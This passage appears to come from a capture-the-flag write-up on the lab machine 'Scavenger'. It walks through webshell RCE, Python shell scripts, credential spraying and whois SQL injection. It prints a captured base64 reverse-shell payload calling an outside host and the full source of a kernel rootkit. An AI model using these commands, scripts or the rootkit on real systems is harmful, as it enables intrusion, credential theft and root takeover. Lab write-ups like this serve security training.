[14:26:04] 403 -  354B  - /scripts/ckeditor/ckfinder/core/connector/php/connector.php
[14:26:04] 403 -  304B  - /scripts/
[14:26:04] 403 -  319B  - /scripts/no-such-file.pl
[14:26:04] 403 -  312B  - /scripts/root.exe?/c+dir
[14:26:04] 403 -  330B  - /scripts/samples/search/webhits.exe
[14:26:04] 403 -  311B  - /scripts/tinymce
[14:26:04] 403 -  321B  - /scripts/tools/getdrvs.exe
[14:26:04] 403 -  313B  - /scripts/setup.php
[14:26:04] 403 -  320B  - /scripts/tools/newdsn.exe
[14:26:04] 403 -  312B  - /scripts/tiny_mce
[14:26:04] 403 -  309B  - /server-status
[14:26:04] 403 -  310B  - /server-status/
[14:26:04] 200 -    0B  - /shell.php
[14:26:07] 200 -    0B  - /vendor/composer/autoload_files.php
[14:26:07] 200 -    0B  - /vendor/composer/autoload_classmap.php
[14:26:07] 200 -    1KB - /vendor/composer/LICENSE
[14:26:07] 200 -    0B  - /vendor/composer/autoload_real.php
[14:26:07] 200 -    0B  - /vendor/composer/autoload_static.php
[14:26:07] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[14:26:07] 200 -    0B  - /vendor/autoload.php
[14:26:07] 200 -    0B  - /vendor/composer/autoload_psr4.php
[14:26:07] 200 -    0B  - /vendor/composer/ClassLoader.php
[14:26:07] 200 -   59KB - /vendor/composer/installed.json
[14:26:07] 200 -    5KB - /view.php

Task Completed

```

The `readme.md` file jumps out as interesting. I’ll read it:

```

root@kali# curl -s http://sec03.rentahacker.htb/readme.md | head
Mantis Bug Tracker (MantisBT)
=============================

[![Build Status](https://img.shields.io/travis/mantisbt/mantisbt/master.svg)](https://travis-ci.org/mantisbt/mantisbt)
[![Gitter](https://img.shields.io/gitter/room/mantisbt/mantisbt.svg)](https://gitter.im/mantisbt/mantisbt?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)

Screenshots
-----------

![Build Status](doc/modern_view_issues.png)

```

There’s an install of [Mantis Bug Tracker](https://www.mantisbt.org/), which was what the hacker was referencing in their comment. I can go down the rabbit hole and log in there (default creds work), but there’s something else interesting: `shell.php`.

At first I assumed this was left over from another user, but it’s there on fresh reset.

## RCE as ib01c03

### Find Parameter

If I request `shell.php`, nothing comes back:

```

root@kali# curl http://sec03.rentahacker.htb/shell.php

```

Running with `-I` to get headers, I see it’s a `200 OK` response with just no content:

```

root@kali# curl -I http://sec03.rentahacker.htb/shell.php
HTTP/1.1 200 OK
Date: Sun, 25 Aug 2019 11:26:04 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=UTF-8

```

If it’s anything like my `php` webshells, it’s something simple like `<?php system($_GET["cmd"]); ?>`. But to use that, I’ll need to know what parameter it’s reading. I’ll use `wfuzz` to try a bunch. As always, I’ll start this, see the length of the default response, kill it, and add (in this case) `--hh 0` and start again. This finds the parameter:

```

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://sec03.rentahacker.htb/shell.php?FUZZ=id --hh 0
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://sec03.rentahacker.htb/shell.php?FUZZ=id
Total requests: 2588

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000197:  C=200      1 L        3 W           61 Ch        "hidden"

Total time: 55.28373
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 46.81304

```

### RCE

I can test this out with curl:

```

root@kali# curl http://sec03.rentahacker.htb/shell.php?hidden=id
uid=1003(ib01c03) gid=1004(customers) groups=1004(customers)

```

If I want to do any longer commands, I’ll need to urlencode them. I can have curl do that for me too:

```

root@kali# curl -G http://sec03.rentahacker.htb/shell.php --data-urlencode "hidden=id"
uid=1003(ib01c03) gid=1004(customers) groups=1004(customers)

```

### Connectivity

Unfortunately, I can’t seem to get anything to connect back to me. I tried on numerous ports to connect back with `nc`, but all without success. I was able to ping myself:

```

root@kali# curl -G http://sec03.rentahacker.htb/shell.php --data-urlencode "hidden=ping -c 1 10.10.14.5"
PING 10.10.14.5 (10.10.14.5) 56(84) bytes of data.
64 bytes from 10.10.14.5: icmp_seq=1 ttl=63 time=23.1 ms
--- 10.10.14.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 23.107/23.107/23.107/0.000 ms

```

And see the it locally:

```

root@kali# tcpdump -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
07:22:56.316603 IP 10.10.10.155 > 10.10.14.5: ICMP echo request, id 13436, seq 1, length 64
07:22:56.316662 IP 10.10.14.5 > 10.10.10.155: ICMP echo reply, id 13436, seq 1, length 64 

```

I’ll look at the IpTables rules in [Beyond Root](#iptables).

### Simple Shell

Given that I’ll be enumerating with just the RCE, I’ll script a shell to make it easier:

```

#!/usr/bin/env python3

import requests
from cmd import Cmd

class Term(Cmd):
    prompt = "scavenger> "

    def default(self, args):
        resp = requests.get('http://sec03.rentahacker.htb/shell.php',
                params = {"hidden": args}, proxies={'http':'http://127.0.0.1:8080'})
        print(resp.text)

term = Term()
term.cmdloop()

```

This will run commands, though there’s no state, so I can’t change directories, or get a tty to run `su`:

```

root@kali# ./scavenger-simple.py 
scavenger> id
uid=1003(ib01c03) gid=1004(customers) groups=1004(customers)

scavenger> pwd
/home/ib01c03/sec03

```

### Stateful Shell

In the way that I like to do unnecessary polishing of my access, I created a stateful shell using the mkfifo technique I first [learned from Ippsec](https://www.youtube.com/watch?v=k6ri-LFWEj4) to go from RCE to stateful shell. I first implemented something like this in [Stratosphere](/2018/09/01/htb-stratosphere.html#building-a-shell). The idea is to create a pipe, `input`, and then `tail -f` that file so that any new content written to it is immediately passed to `sh` and the results are passed to another file. Then I’ll just have a thread constantly reading from that file.

```

#!/usr/bin/env python3

import base64
import random
import requests
import threading
import time
from cmd import Cmd

class Term(Cmd):
    prompt = "scavenger> "

    def __init__(self):
        Cmd.__init__(self)
        session = random.randrange(10000, 99999)
        self.interval = 0.5
        print(f"[*] Session ID: {session}")
        self.stdin = f"/dev/shm/input.{session}"
        self.stdout = f"/dev/shm/output.{session}"

        print("[*] Setting up fifo shell on target")
        self.run_raw_command(
            f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}",
            timeout=0.1,
        )

        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    def ReadThread(self):
        print("[+] Read Thread starting")
        GetOutput = f"""/bin/cat {self.stdout}"""
        ClearOutput = f"""echo -n "" > {self.stdout}"""

        while True:
            result = self.run_raw_command(GetOutput)
            if result:
                print(result)
                self.run_raw_command(ClearOutput)
            time.sleep(self.interval)

    def do_toggle_prompt(self, args):
        if self.prompt == "":
            self.prompt = "scavenger> "
        else:
            self.prompt = ""

    def default(self, args):
        b64cmd = base64.b64encode(f"{args.rstrip()}\n".encode("utf-8")).decode("utf-8")
        stage_cmd = f"echo {b64cmd} | base64 -d > {self.stdin}"
        self.run_raw_command(stage_cmd)
        time.sleep(self.interval * 1.1)

    def run_raw_command(self, cmd, timeout=50):
        try:
            return requests.get(
                "http://sec03.rentahacker.htb/shell.php",
                params={"hidden": cmd},
                timeout=timeout,
            ).text
        except requests.exceptions.ReadTimeout:
            pass

term = Term()
try:
    term.cmdloop()
except KeyboardInterrupt:
    term.run_raw_command("rm /dev/shm/output*i /dev/shm/input*")
    print()

```

In this shell, I can `su`, change directories, etc, as it is a single running `sh` process.

## FTP Accesses

### Enumeration

Looking around the box, I find two sets of credentials that are useful The first is in the current user’s home directory, in the website install, there’s credentials for the database:

```

scavenger> pwd
/home/ib01c03/sec03/config

scavenger> cat config_inc.php
<?php
$g_hostname               = 'localhost';
$g_db_type                = 'mysqli';
$g_database_name          = 'ib01c03';
$g_db_username            = 'ib01c03';
$g_db_password            = 'Thi$sh1tIsN0tGut';

$g_default_timezone       = 'Europe/Berlin';

$g_crypto_master_salt     = 'DCD4OIydnPefp27q8Bu5TJHE2RfyO4Zit13B6zLfJdQ=';

```

Additionally, digging around some more, there’s mail in `/var/spool/mail`:

```

scavenger> ls -l
total 8
-rw-rw-r-- 1 root mail 1274 Dec 10  2018 ib01c03
-rw-rw---- 1 root mail 1043 Dec 11  2018 support

```

I can’t read `support`, but I can read `ib01c03`:

```

scavenger> cat ib01c03       
From support@ib01.supersechosting.htb Mon Dec 10 21:10:56 2018
Return-path: <support@ib01.supersechosting.htb>
Envelope-to: ib01c03@ib01.supersechosting.htb
Delivery-date: Mon, 10 Dec 2018 21:10:56 +0100
Received: from support by ib01.supersechosting.htb with local (Exim 4.89)
        (envelope-from <support@ib01.supersechosting.htb>)
        id 1gWRtI-0000ZK-8Q
        for ib01c03@ib01.supersechosting.htb; Mon, 10 Dec 2018 21:10:56 +0100
To: <ib01c03@ib01.supersechosting.htb>
Subject: Re: Please help! Site Defaced!
In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100
        <E1gWRnN-0000XA-44@ib01.supersechosting.htb>
References: <E1gWRnN-0000XA-44@ib01.supersechosting.htb>
X-Mailer: mail (GNU Mailutils 3.1.1)
Message-Id: <E1gWRtI-0000ZK-8Q@ib01.supersechosting.htb>
From: support <support@ib01.supersechosting.htb>
Date: Mon, 10 Dec 2018 21:10:56 +0100
X-IMAPbase: 1544472964 2
Status: O
X-UID: 1

>> Please we need your help. Our site has been defaced!
>> What we should do now?
>>
>> rentahacker.htb

Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs.
Please check if there is any strange file in your web root and upload it to the ftp server:
ftp.supersechosting.htb
user: ib01ftp
pass: YhgRt56_Ta

Thanks.

```

I’ll start a list of usernames and a list of passwords:

```

root@kali# cat users
root
ib01c01
ib01c02
ib01c03
ib01ftp
ib01www
support
root@kali# cat passwords
Thi$sh1tIsN0tGut
YhgRt56_Ta

```

### FTP as ib01ftp

I’ll connect using the creds from the email, and see what new I can access. I’m dropped into the home directory of ib01ftp, and there’s a folder `incidents`:

```

root@kali# ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:root): ib01ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/home/ib01ftp" is the current directory
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xrwx---    4 1005     1000         4096 Dec 10  2018 incidents
226 Directory send OK.

```

The folder contains two directories:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xrwx---    2 1005     1000         4096 Jan 30  2019 ib01c01
dr-xrwx---    2 1005     1000         4096 Dec 10  2018 ib01c03
226 Directory send OK.

```

There’s nothing in `ib01c03`, presumably because they haven’t started investigating the hacking into the Mantis Bug Track site hosted there. Inside `ib01c01`, there’s three files:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--rw-r--    1 1005     1000        10427 Dec 10  2018 ib01c01.access.log
-rw-r--r--    1 1000     1000       835084 Dec 10  2018 ib01c01_incident.pcap
-r--rw-r--    1 1005     1000          173 Dec 11  2018 notes.txt
226 Directory send OK.

```

I’ll download the files and take a look. `notes.txt`:

```

root@kali# cat notes.txt 
After checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!

```

Looking through the `pcap` in `wireshark`, I’ll find a few interesting tcp streams. The most important is 20, where the attacker is visiting `www.pwnhats.htb` and sends a post to login with the password “GetYouAH4t!”. I’ll add that to my password list.

Stream 25 is also interesting. It’s another POST request. One of the items in the POST is this:

```

Content-Disposition: form-data; name="PS_SAV_IMAP_URL"

x -oProxyCommand=`echo$IFS$()bWtmaWZvIC90bXAvb3NmaWZ0bTsgbmMgMTAuMC4yLjE5IDQ0NDQgMDwvdG1wL29zZmlmdG0gfCAvYmluL3NoID4vdG1wL29zZmlmdG0gMj4mMTsgcm0gL3RtcC9vc2ZpZnRt|base64$IFS$()-d|bash`}
--_Part_913_1903200859_125024680
Content-Disposition: form-data; name="PS_SAV_IMAP_PORT"

143

```

It’s hard to know for sure what exploit this is targeting, but the `oProxyCommand` contains a string that looks obviously malicious:

```

`echo$IFS$()bWtmaWZvIC90bXAvb3NmaWZ0bTsgbmMgMTAuMC4yLjE5IDQ0NDQgMDwvdG1wL29zZmlmdG0gfCAvYmluL3NoID4vdG1wL29zZmlmdG0gMj4mMTsgcm0gL3RtcC9vc2ZpZnRt|base64$IFS$()-d|bash`

```

It’s in backticks, which means the shell will execute this, and it `echo` a base64 string into `base64 -d` and then into `bash`. That string decodes to a standard reverse shell:

```

mkfifo /tmp/osfiftm; nc 10.0.2.19 4444 0</tmp/osfiftm | /bin/sh >/tmp/osfiftm 2>&1; rm /tmp/osfiftm

```

Sure enough, stream 26 is the webserver connecting to the attacker on 4444, and running commands:

```

ls
ajax-tab.php
ajax.php
ajax_products_list.php
autoupgrade
backup.php
backups
bootstrap.php
cron_currency_rates.php
displayImage.php
drawer.php
export
favicon.ico
filemanager
footer.inc.php
functions.php
get-file-admin.php
grider.php
header.inc.php
import
index.php
init.php
pdf.php
public
robots.txt
searchcron.php
themes
webpack.config.js
cd /tmp
ls -la
total 8
drwxrwxrwt  2 root    root      4096 Dec 10 21:52 .
drwxr-xr-x 22 root    root      4096 Dec  4 21:20 ..
prw-r--r--  1 ib01c01 customers    0 Dec 10 21:52 osfiftm
wget 10.0.2.19/Makefile
--2018-12-10 21:53:00--  http://10.0.2.19/Makefile
Connecting to 10.0.2.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 154 [application/octet-stream]
Saving to: 'Makefile'

     0K                                                       100% 19.0M=0s

2018-12-10 21:53:00 (19.0 MB/s) - 'Makefile' saved [154/154]

wget 10.0.2.19/root.c
--2018-12-10 21:53:20--  http://10.0.2.19/root.c
Connecting to 10.0.2.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3094 (3.0K) [text/plain]
Saving to: 'root.c'

     0K ...                                                   100%  318M=0s

2018-12-10 21:53:20 (318 MB/s) - 'root.c' saved [3094/3094]

mkfifo /tmp/rH7dQR; /bin/bash -i 2>&1 < /tmp/rH7dQR | openssl s_client -quiet -connect 10.0.2.19:4445 > /tmp/rH7dQR; rm /tmp/rH7dQR
depth=0 C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
verify error:num=18:self signed certificate
verify return:1
depth=0 C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
verify return:1

```

Streams 27 and 28 are the two `wget` requests for `Makefile` and `root.c`. `Makefile` is a standard Makefile, but `root.c` is interesting. I’ll come back to that later. Stream 29 is an encrypted connection, on 4445, so the `openssl` command from the end of 26.

### FTP Creds Check

The email said one pair of creds would work, but I want to check all the creds I have here. I’ll use `hydra` to check them for ssh and ftp.

```

root@kali# hydra -L users -P passwords 10.10.10.155 -t 4 ssh

[DATA] max 4 tasks per 1 server, overall 4 tasks, 21 login tries (l:7/p:3), ~6 tries per task
[DATA] attacking ssh://10.10.10.155:22/
1 of 1 target completed, 0 valid passwords found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-08-25 12:23:50
root@kali# hydra -L users -P passwords 10.10.10.155 -t 4 ftp

[DATA] max 4 tasks per 1 server, overall 4 tasks, 21 login tries (l:7/p:3), ~6 tries per task
[DATA] attacking ftp://10.10.10.155:21/
[21][ftp] host: 10.10.10.155   login: ib01c01   password: GetYouAH4t!
[21][ftp] host: 10.10.10.155   login: ib01c03   password: Thi$sh1tIsN0tGut
[21][ftp] host: 10.10.10.155   login: ib01ftp   password: YhgRt56_Ta
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-08-25 12:24:09

```

Nothing on ssh, but three matches on ftp.

Access as ib01c03 doesn’t seem to give me any more access than I already have with my shell.

### FTP as ib01c01

I can connect as ib01c01, and I’m in that user’s home directory. I can see the `www` folder for the hats site, as well as `access.txt` and `user.txt`:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
226 Directory send OK.

```

I’ll download both txt files, and get the user flag:

```

root@kali# cat user.txt
6f8a8a83************************

```

## Privesc to root

### Enumeration

With FTP access as ib01c01, I’ll run `ls -a` to look for hidden folders, and find one:

```

ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    4 1001     1004         4096 Feb 01  2019 .
drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
-rw-------    1 0        0               0 Dec 11  2018 .bash_history
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
226 Directory send OK.

```

`...` is certainly sketchy, and it contains a single file:

```

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          399400 Feb 02  2019 root.ko
226 Directory send OK.

```

It’s a kernel module, and I’m guessing based on the name, a rootkit. I’ll download it.

### OSINT

Before opening this thing up to take a look, I’ll look at `root.c` that was uploaded by the attacker:

```

#include <linux/init.h>   
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>    
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

#define  DEVICE_NAME "ttyR0" 
#define  CLASS_NAME  "ttyR"

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

// Prototypes
static int     __init root_init(void);
static void    __exit root_exit(void);
static int     root_open  (struct inode *inode, struct file *f);
static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);

// Module info
MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("pico");
MODULE_DESCRIPTION("Got r00t!."); 
MODULE_VERSION("0.1"); 

static int            majorNumber; 
static struct class*  rootcharClass  = NULL;
static struct device* rootcharDevice = NULL;

static struct file_operations fops =
{
  .owner = THIS_MODULE,
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

static int
root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t
root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t
root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{ 
  char   *data;
  char   magic[] = "g0tR0ot";

  struct cred *new_cred;
  
  data = (char *) kmalloc (len + 1, GFP_KERNEL);
    
  if (data)
    {
      copy_from_user (data, buf, len);
        if (memcmp(data, magic, 7) == 0)
	  {
	    if ((new_cred = prepare_creds ()) == NULL)
	      {
		return 0;
	      }
	    V(new_cred->uid) = V(new_cred->gid) =  0;
	    V(new_cred->euid) = V(new_cred->egid) = 0;
	    V(new_cred->suid) = V(new_cred->sgid) = 0;
	    V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
	    commit_creds (new_cred);
	  }
        kfree(data);
      }
    
    return len;
}

static int __init
root_init(void)
{
  // Create char device
  if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
    {
      return majorNumber;
    }
 
   // Register the device class
   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(rootcharClass))
     {
       unregister_chrdev(majorNumber, DEVICE_NAME);
       return PTR_ERR(rootcharClass); 
   }
 
   // Register the device driver
   rootcharDevice = device_create(rootcharClass, NULL,
				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(rootcharDevice))
     {
       class_destroy(rootcharClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       return PTR_ERR(rootcharDevice);
     }

    return 0;    
}

static void __exit
root_exit(void) 
{
  // Destroy the device
  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
  class_unregister(rootcharClass);                     
  class_destroy(rootcharClass);                        
  unregister_chrdev(majorNumber, DEVICE_NAME);     
}

module_init(root_init);
module_exit(root_exit);

```

Some Googling of strings from this source lands me [on 0x00sec.org](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485). Comparing the source to the code from this post confirms it’s the same. To trigger the root kit in the post, I need to send the password, “g0tR0ot” to `/dev/ttyR0`. In the example from the site, it works:

```

$ id
uid=1000(pico) gid=1000(pico) groups=1000(pico)
$ echo "g0tR0ot" > /dev/ttyR0
$ id
uid=0(root) gid=0(root) groups=0(root)

```

On Scavenger, it does not:

```

root@kali# ./scavenger-stateful.py 
[*] Session ID: 52451
[*] Setting up fifo shell on target
[+] Read Thread starting
scavenger> python -c 'import pty;pty.spawn("/bin/sh")'
$ 
scavenger> toggle_prompt
id
uid=1003(ib01c03) gid=1004(customers) groups=1004(customers)
$ 
echo "g0tR0ot" > /dev/ttyR0
$ 
id
uid=1003(ib01c03) gid=1004(customers) groups=1004(customers)

```

Still, the fact that `/dev/ttyR0` exists on the box at all hints that I’m in the right spot.

### RE

Now I’ll open the module in Ida Pro free and take a look. Ida highlights in white five user defined functions to take a look at:

![1566759480538](https://0xdfimages.gitlab.io/img/1566759480538.png)

Consistent with the blog post, `root_write` is the interesting one.

Right away I can see that the result of a `memcmp` determines if it goes into setting the user information to 0 (root), or to failure:

![1566759635185](https://0xdfimages.gitlab.io/img/1566759635185.png)

That `memcmp` compares two strings - the input stream and `magic`, the result of a`snprintf` call:

![1566759813927](https://0xdfimages.gitlab.io/img/1566759813927.png)

Looking at bit up, I can determine that that call looks like:

```

snprintf(magic, 8, "%s%s", a, b)

```

`a` and `b` are set earlier in the function:

![1566759883542](https://0xdfimages.gitlab.io/img/1566759883542.png)

So the check is input against `g3tPr1v`.

### root Priv

I’ll take this new password back and give it another try in my stateful shell, and it works:

```

$ 
echo "g3tPr1v" > /dev/ttyR0
$ 
id
uid=0(root) gid=0(root) groups=0(root),1004(customers)

```

Now I can get `root.txt`:

```

$ 
cat /root/root.txt
4a08d817************************

```

I could also do this without a stateful shell, just using the RCE. I’ll demonstrate with curl:

```

root@kali# curl -G http://sec03.rentahacker.htb/shell.php --data-urlencode 'hidden=echo "g3tPr1v" > /dev/ttyR0; id; cat /root/root.txt'
uid=0(root) gid=0(root) groups=0(root),1004(customers)
4a08d817************************

```

## Beyond Root

### Whois SQLi

#### More SQLi

In my initial enumeration I found and dumped a bunch of domains via SQL injection in the whois server. I did poke at that a bit more to see if I could find anything useful.

DB version:

```

root@kali# whois -h 10.10.10.155 -p 43 "supersechostinga.htb') UNION SELECT @@version,2#"
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
10.1.37-MariaDB-0+deb9u1

```

The current user:

```

root@kali# whois -h 10.10.10.155 -p 43 "supersechostinga.htb') UNION SELECT user(),2#" | grep -vE "^%"
whois@localhost

```

DBs:

```

root@kali# whois -h 10.10.10.155 -p 43 "supersechostinga.htb') UNION SELECT GROUP_CONCAT(schema_name SEPARATOR '\n'),2 FROM information_schema.schemata#" | grep -vE "^%"
information_schema
whois

```

Tables in `whois` database:

```

root@kali# whois -h 10.10.10.155 -p 43 "supersechostinga.htb') UNION SELECT GROUP_CONCAT(table_name SEPARATOR '\n'),2 FROM information_schema.tables WHERE table_schema = 'whois'#" | grep -vE "^%"
customers

```

Columns in `customers` table:

```

root@kali# whois -h 10.10.10.155 -p 43 "supersechostinga.htb') UNION SELECT GROUP_CONCAT(column_name SEPARATOR '\n'),2 FROM information_schema.columns WHERE table_schema = 'whois'#" | grep -vE "^%"
id
domain
data

```

A list of the customers:

```

root@kali# whois -h 10.10.10.155 -p 43 "supersechostinga.htb') UNION SELECT GROUP_CONCAT(CONCAT(id, ': ', domain) SEPARATOR '\n'),2 FROM customers#" | grep -vE "^%"
1: supersechosting.htb
2: justanotherblog.htb
3: pwnhats.htb
4: rentahacker.htb

```

#### Whois Source

With a shell on the Scavenger, I pulled the source, which is just a Python application at `/opt/whois/whois.py`:

```

#!/usr/bin/env python
import SocketServer
import mysql.connector
import unicodedata

class MyTCPHandler(SocketServer.StreamRequestHandler):
    def handle(self):
        # self.rfile is a file-like object created by the handler;
        # we can now use e.g. readline() instead of raw recv() calls
        self.data = self.rfile.readline().strip()
        # Likewise, self.wfile is a file-like object used to write back to the client
        self.wfile.write(self.queryData(self.data))

    def queryData(self,term):
        domain=term.lower()
        data =""
        data+="% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37\r\n"
        data+="% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb\r\n"

        mydb = mysql.connector.connect(
            host="localhost",
            user="whois",
            passwd="whois",
            database="whois")
        mycursor = mydb.cursor()
        try:
            mycursor.execute("SELECT data, domain FROM customers where domain like ('"+domain+"') limit 1;")
            myresult = mycursor.fetchall()
            data+="% This query returned "+str(len(myresult))+" object\r\n"
            if len(myresult)>0:
                for result in myresult:
                    data+=result[0]
        except mysql.connector.Error as err:
            data+=str(err)
        return data

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 43
    # Create the server, binding to localhost on port 42
    server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)
    # Activate the server; this will keep running until you
    # interrupt the program with Ctrl-C
    server.serve_forever()

```

The line that does the SQL query has no sanitization of user input:

```

mycursor.execute("SELECT data, domain FROM customers where domain like ('"+domain+"') limit 1;")

```

### iptables

Once I found RCE via the webshell, I tried to get a reverse shell, but failed. I ended up not needing one, but I wanted to look at what was stopping the shell. The IP tables rules show it:

```

$ 
iptables -L -v
Chain INPUT (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
   35  2909 ACCEPT     icmp --  any    any     anywhere             anywhere            
 2191  146K ACCEPT     udp  --  any    any     anywhere             anywhere             udp spt:domain u32 "0x1e=0x81000000:0x81ffffff"
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ftp-data
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ftp
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:smtp
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:whois
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:domain
 4374  292K ACCEPT     udp  --  any    any     anywhere             anywhere             udp dpt:domain
 2169  192K ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:http
   11   529 ACCEPT     all  --  lo     any     anywhere             anywhere            
 3170  262K REJECT     all  --  any    any     anywhere             anywhere             reject-with icmp-port-unreachable

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
   35  2909 ACCEPT     icmp --  any    any     anywhere             anywhere            
12509  832K ACCEPT     udp  --  any    any     anywhere             anywhere             udp dpt:domain u32 "0x1e=0x1000000:0x1ffffff"
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp spt:ftp-data
 2202  147K ACCEPT     all  --  any    lo      anywhere             anywhere            
 1467  154K ACCEPT     tcp  --  any    any     anywhere             anywhere             state ESTABLISHED
    0     0 ACCEPT     udp  --  any    any     anywhere             anywhere             state ESTABLISHED
   11   572 REJECT     all  --  any    any     anywhere             anywhere             reject-with icmp-port-unreachable

```

Specifically looking at the OUTPUT rules, the default policy is to block. Then , the rules are:
1. Allow icmp out.
2. Allow DNS out based on dest port.
3. Allow FTP-data out based on source port.
4. Allow anything out via loopback.
5. Allow established TCP connections out.
6. Allow established UDP connections out.
7. Reject.

### Exim Exploit CVE-2019-10149

I had written some defensive signatures for this CVE when it was released in summer 2019, so I was excited to see this box potentially running a vulnerable version of EXIM. It took a bit of playing around with, but [this post](https://glitchwitch.io/blog/2019-06/exploiting-cve-2019-10149/) really helped. Shoutout to jkr, who was very helpful in figuring this out.

I’ll do a `touch` on the file first, as if EXIM creates it, it creates it with permissions 600, which means I won’t be able to read it. Then, I’ll string a bunch of `echo` and `sleep` to simulate the SMTP connection, sending the malicious payload in the to address. In this case, I’ll have it run the command to copy the root flag into `/dev/shm`. It’s tricky not to use `/tmp` here, since systemd’s private tmp feature means that Apache and EXIM have different `/tmp`.

```

